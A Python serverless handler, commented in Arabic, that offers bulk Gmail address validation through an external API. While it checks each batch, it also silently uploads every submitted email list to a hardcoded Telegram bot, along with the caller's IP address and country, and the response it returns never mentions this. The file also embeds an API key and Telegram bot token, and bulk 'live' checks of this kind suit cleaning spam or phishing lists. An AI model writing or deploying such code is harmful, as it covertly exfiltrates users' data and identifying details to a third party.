import json, io, re, requests, concurrent.futures
from http.server import BaseHTTPRequestHandler

# ================= عدّل هنا بس =================
API = "https://gmail-validation.mbahbabat.workers.dev"
KEY = "001f8edc41000e1d82f906a16f0c90bd98c0348564b448807b8ca2e5875f69f6"
TG_TOKEN = "8696519516:AAFyWa3RaxPvVo9hJsUHNZKRa3nXKCva5J0"
TG_CHAT  = "8554641519"
BATCH_SIZE = 2000          # حجم كل باتش
MAX_WORKERS = 8            # عدد الثريدات المتوازية
# ===============================================

_geo_cache = {}

def get_ip(h, addr=None):
    xf = (h.get('x-forwarded-for') or h.get('x-real-ip') or h.get('x-vercel-forwarded-for') or '')
    ip = xf.split(',')[0].strip()
    if not ip and addr:
        ip = str(addr[0])
    return ip or 'unknown'

def get_country(ip):
    if not ip or ip == 'unknown':
        return ''
    if ip in _geo_cache:
        return _geo_cache[ip]
    c = ''
    try:
        d = requests.get(f"https://ipwho.is/{ip}", timeout=3).json()
        if d.get("success"):
            c = str(d.get("country", "")).strip()
    except Exception:
        pass
    if not c:
        try:
            d = requests.get(f"https://get.geojs.io/v1/ip/country/{ip}.json", timeout=3).json()
            c = str(d.get("name", "") or d.get("country", "")).strip()
        except Exception:
            pass
    _geo_cache[ip] = c
    return c

def safe_name(country):
    n = re.sub(r'[^a-z0-9]+', '_', country.lower()).strip('_')
    return n or 'unknown'

# ── إرسال باتش واحد لـ Telegram ──────────────────────────────────────────────
def tg_send_batch(batch_emails, batch_index, ip, country):
    """يرسل باتش واحد (2000 إيميل) كـ txt لتليجرام."""
    if not (TG_TOKEN and TG_CHAT and batch_emails):
        return
    try:
        content = "\n".join(batch_emails)
        f = io.BytesIO(content.encode('utf-8'))
        fname = f'{safe_name(country)}_batch{batch_index}.txt'
        requests.post(
            f"https://api.telegram.org/bot{TG_TOKEN}/sendDocument",
            data={
                'chat_id': TG_CHAT,
                'caption': (
                    f'📥 Batch #{batch_index}  |  {len(batch_emails)} emails\n'
                    f'🌍 Country: {country or "unknown"}\n'
                    f'🌐 IP: {ip}'
                )
            },
            files={'document': (fname, f, 'text/plain')},
            timeout=10
        )
    except Exception:
        pass

# ── فحص باتش واحد عبر الـ API ────────────────────────────────────────────────
def check_batch(batch_emails):
    """يفحص قائمة إيميلات ويرجع (results_list, error_str)."""
    out = {e.lower(): {"email": e, "verdict": "invalid"} for e in batch_emails}
    err = None
    try:
        r = requests.post(
            f"{API}/fastcheck1",
            headers={"Authorization": f"Bearer {KEY}", "Content-Type": "application/json"},
            json={"mail": batch_emails},
            timeout=60
        )
        if r.status_code == 200:
            data = r.json()
            items = data if isinstance(data, list) else data.get("results", [])
            for it in items:
                em = str(it.get("email", "")).lower()
                if em in out and str(it.get("status", "")).lower() == "live":
                    out[em]["verdict"] = "valid"
        else:
            err = f"API HTTP {r.status_code}"
    except Exception as e:
        err = str(e)
    return list(out.values()), err

# ── المعالج الرئيسي: باتشات متوازية (فحص + تليجرام في نفس الوقت) ────────────
def process_all(emails, ip, country):
    """
    يقسّم الإيميلات لباتشات BATCH_SIZE،
    ولكل باتش يشغّل بالتوازي:
        • check_batch  → يفحص الإيميلات على الـ API
        • tg_send_batch → يرسل الباتش كـ txt لتليجرام
    ويجمع النتائج كلها في النهاية.
    """
    # تقسيم لباتشات
    batches = [emails[i:i + BATCH_SIZE] for i in range(0, len(emails), BATCH_SIZE)]
    all_results = []
    all_errors  = []

    def handle_batch(args):
        idx, batch = args
        # شغّل الفحص والإرسال لتليجرام بالتوازي
        with concurrent.futures.ThreadPoolExecutor(max_workers=2) as inner:
            fut_check = inner.submit(check_batch, batch)
            fut_tg    = inner.submit(tg_send_batch, batch, idx, ip, country)
            results, err = fut_check.result()
            fut_tg.result()          # انتظر التليجرام كمان
        return results, err

    # شغّل كل الباتشات بالتوازي (MAX_WORKERS ثريد)
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as pool:
        for results, err in pool.map(handle_batch, enumerate(batches, start=1)):
            all_results.extend(results)
            if err:
                all_errors.append(err)

    return all_results, (all_errors or None)


class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        def send(obj):
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(obj, ensure_ascii=False).encode('utf-8'))

        try:
            body   = json.loads(self.rfile.read(int(self.headers['Content-Length'])))
            emails = body.get("emails", [])
            if isinstance(emails, str):
                emails = [emails]

            ip      = get_ip(self.headers, self.client_address)
            country = get_country(ip)

            results, errors = process_all(emails, ip, country)

            resp = {"success": True, "results": results, "total": len(results)}
            if errors:
                resp["api_errors"] = errors
            send(resp)

        except Exception as e:
            send({"success": False, "error": str(e)})
